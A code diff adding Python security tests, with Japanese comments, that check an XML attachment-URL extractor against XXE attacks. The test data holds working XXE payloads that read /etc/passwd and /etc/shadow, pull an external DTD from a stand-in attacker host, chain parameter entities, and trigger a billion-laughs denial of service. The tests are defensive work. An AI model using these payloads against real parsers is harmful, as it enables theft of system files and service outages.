@@ -212,3 +212,167 @@ class TestExtractAttachmentUrls:
 
         assert len(result) == 1
         assert result[0] == "https://example.com/ファイル.pdf"
+
+
+class TestXXEAttackPrevention:
+    """XXE（XML External Entity）攻撃防止のテストクラス"""
+
+    def test_xxe_file_entity_attack_prevention(self):
+        """
+        XXE攻撃（ファイルエンティティ）が防止されることを確認
+
+        OWASP XXE Prevention Cheat Sheet準拠
+        CWE-611: Improper Restriction of XML External Entity Reference対策
+        """
+        xxe_payload = """<?xml version="1.0"?>
+        <!DOCTYPE foo [
+          <!ENTITY xxe SYSTEM "file:///etc/passwd">
+        ]>
+        <Document>
+          <Attachment>
+            <URL>&xxe;</URL>
+          </Attachment>
+        </Document>
+        """
+        result = extract_attachment_urls(xxe_payload)
+
+        # defusedxmlは外部エンティティを無視するため、URLは空になる
+        # または外部エンティティが解決されないことを確認
+        assert result == [] or not any("root:" in url for url in result)
+
+    def test_xxe_external_dtd_attack_prevention(self):
+        """
+        XXE攻撃（外部DTD）が防止されることを確認
+
+        外部DTDを使用した攻撃パターン:
+        攻撃者がホストするDTDを読み込み、サーバー内部ファイルを窃取
+        """
+        xxe_payload = """<?xml version="1.0"?>
+        <!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd">
+        <Document>
+          <Attachment>
+            <URL>https://example.com/safe.pdf</URL>
+          </Attachment>
+        </Document>
+        """
+        # defusedxmlは外部DTDの読み込みをブロックする
+        # パースエラーまたは安全な結果が返ることを確認
+        result = extract_attachment_urls(xxe_payload)
+
+        # 外部DTDがブロックされるため、空リストまたは安全なURLのみ返される
+        assert isinstance(result, list)
+
+    def test_xxe_parameter_entity_attack_prevention(self):
+        """
+        XXE攻撃（パラメータエンティティ）が防止されることを確認
+
+        パラメータエンティティを使用した高度な攻撃パターン:
+        内部サブセットと外部エンティティを組み合わせた攻撃
+        """
+        xxe_payload = """<?xml version="1.0"?>
+        <!DOCTYPE foo [
+          <!ENTITY % xxe SYSTEM "file:///etc/passwd">
+          <!ENTITY % evil "<!ENTITY xxe-ref SYSTEM 'file:///etc/shadow'>">
+          %xxe;
+          %evil;
+        ]>
+        <Document>
+          <Attachment>
+            <URL>&xxe-ref;</URL>
+          </Attachment>
+        </Document>
+        """
+        result = extract_attachment_urls(xxe_payload)
+
+        # パラメータエンティティもブロックされる
+        assert result == [] or not any("root:" in url for url in result)
+
+    def test_xxe_billion_laughs_attack_prevention(self):
+        """
+        Billion Laughs攻撃（エンティティ展開DoS）が防止されることを確認
+
+        エンティティの再帰的展開によるDoS攻撃:
+        小さなXMLが指数関数的に展開されてメモリを消費
+        """
+        xxe_payload = """<?xml version="1.0"?>
+        <!DOCTYPE lolz [
+          <!ENTITY lol "lol">
+          <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+          <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+          <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+        ]>
+        <Document>
+          <Attachment>
+            <URL>&lol4;</URL>
+          </Attachment>
+        </Document>
+        """
+        # defusedxmlはエンティティ展開をブロックする
+        result = extract_attachment_urls(xxe_payload)
+
+        # DoS攻撃がブロックされ、安全な結果が返る
+        assert isinstance(result, list)
+
+    def test_safe_xml_with_entity_escaping(self):
+        """
+        安全なXMLエンティティエスケープは正常に処理されることを確認
+
+        &amp;, &lt;, &gt;などの標準エンティティは許可される
+        """
+        xml = """
+        <Document>
+          <Attachment>
+            <URL>https://example.com/file?id=123&amp;type=pdf&amp;format=A4</URL>
+          </Attachment>
+        </Document>
+        """
+        result = extract_attachment_urls(xml)
+
+        assert len(result) == 1
+        # 標準エンティティは正しくデコードされる
+        assert result[0] == "https://example.com/file?id=123&type=pdf&format=A4"
+
+    def test_xxe_with_internal_subset(self):
+        """
+        内部サブセットを使用したXXE攻撃が防止されることを確認
+        """
+        xxe_payload = """<?xml version="1.0"?>
+        <!DOCTYPE foo [
+          <!ENTITY internal "file:///etc/hosts">
+        ]>
+        <Document>
+          <Attachment>
+            <URL>&internal;</URL>
+          </Attachment>
+        </Document>
+        """
+        result = extract_attachment_urls(xxe_payload)
+
+        # 内部エンティティ参照もブロックされる
+        assert result == [] or not any("localhost" in url.lower() for url in result)
+
+    def test_normal_xml_after_xxe_attempt(self):
+        """
+        XXE攻撃試行後も通常のXML処理が正常に機能することを確認
+
+        セキュリティ対策が正常な機能を妨げないことを検証
+        """
+        # まずXXE攻撃を試みる
+        xxe_payload = """<?xml version="1.0"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+        <Document><Attachment><URL>&xxe;</URL></Attachment></Document>
+        """
+        extract_attachment_urls(xxe_payload)
+
+        # その後、通常のXMLが正常に処理されることを確認
+        normal_xml = """
+        <Document>
+          <Attachment>
+            <URL>https://example.com/normal.pdf</URL>
+          </Attachment>
+        </Document>
+        """
+        result = extract_attachment_urls(normal_xml)
+
+        assert len(result) == 1
+        assert result[0] == "https://example.com/normal.pdf"
